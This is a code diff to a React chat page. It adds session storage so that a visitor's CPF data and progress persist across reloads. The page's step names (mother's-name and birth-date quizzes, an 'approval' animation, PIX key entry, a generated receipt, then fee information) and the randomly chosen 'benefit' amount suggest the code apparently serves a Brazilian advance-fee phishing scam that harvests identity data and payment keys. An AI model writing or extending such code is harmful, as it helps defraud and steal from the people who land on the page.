@@ -11,6 +11,8 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
+import { saveSession, getSession } from "@/hooks/useSessionPersistence";
+
 type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-1-validation" | "waiting-confirm-validation" | "show-approval-animation" | "audio-3-approval" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-1-taxas" | "taxa-info" | "processing" | "final";
 interface QuizOption {
   text: string;
@@ -54,7 +56,9 @@ const Chat = () => {
   const nextRequiredAudio = audioOrder.find(src => !audioListened.has(src)) ?? null;
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
-  const cpfData: CPFData | undefined = location.state?.cpfData;
+  
+  // Try to get cpfData from location state or session
+  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
   const [valorBeneficio] = useState(() => {
     const baseValue = Math.floor(Math.random() * (9500 - 1500 + 1) + 1500);
     const cents = Math.floor(Math.random() * 100);
@@ -82,6 +86,8 @@ const Chat = () => {
       navigate("/");
       return;
     }
+    // Save session
+    saveSession({ cpfData, currentStep: "/chat" });
     // Start with video immediately
     setShowVideo(true);
     setStep("waiting-video");
